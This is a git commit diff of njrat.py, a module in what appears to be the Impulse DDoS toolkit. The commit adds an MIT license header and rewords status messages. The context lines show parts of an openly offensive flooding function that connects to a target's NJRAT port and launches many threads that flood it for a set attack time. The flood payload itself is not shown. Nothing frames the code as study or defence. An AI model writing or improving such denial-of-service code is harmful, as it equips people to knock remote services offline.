81797077c243992bb01b9e4d9a5a72f6b25b8a25
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-02-12 14:04:13 +0300

    Update njrat.py

--- tools/L4/njrat.py
+++ tools/L4/njrat.py
@@ -1,5 +1,26 @@
-# Created by 0xPh0enix
-# NJRAT DDoS Module for Impulse(https://github.com/LimerBoy/Impulse/)
+#!/usr/bin/env python3
+
+# MIT License
+#
+# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
 
 import time
 import socket
@@ -17,7 +38,7 @@ def NJRAT_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[#] Attack started for " + str(attack_time) + " secounds..")
+	print("[BEGIN] Attack started for " + str(attack_time) + " seconds...")
 	
 
 	threads_list = []
@@ -36,7 +57,7 @@ def NJRAT_ATTACK(threads, attack_time, target):
 				sock.connect((target_ip, target_port))
 			except Exception as e:
 				print(e)
-				print("[-] Failed connect to target`s NJRAT")
+				print("[ERROR] Failed connect to target`s NJRAT!")
 				exit()
 				
 			try:
@@ -46,11 +67,11 @@ def NJRAT_ATTACK(threads, attack_time, target):
 				time.sleep(0.25)
 				continue
 			else:
-				print("[+] NJRAT client connected!")      
+				print("[SUCCESS] NJRAT client connected!")      
 
 	# Start threads
 	for thread in range(threads):
-		print("[#] Staring thread " + str(thread))
+		print("[BEGIN] Staring thread " + str(thread) + "...")
 		t = Thread(target = njrat_flood)
 		t.start()
 		threads_list.append(t)
@@ -63,4 +84,4 @@ def NJRAT_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[!] NJRAT attack stopped!")
+	print("[WARNING] NJRAT attack stopped!")
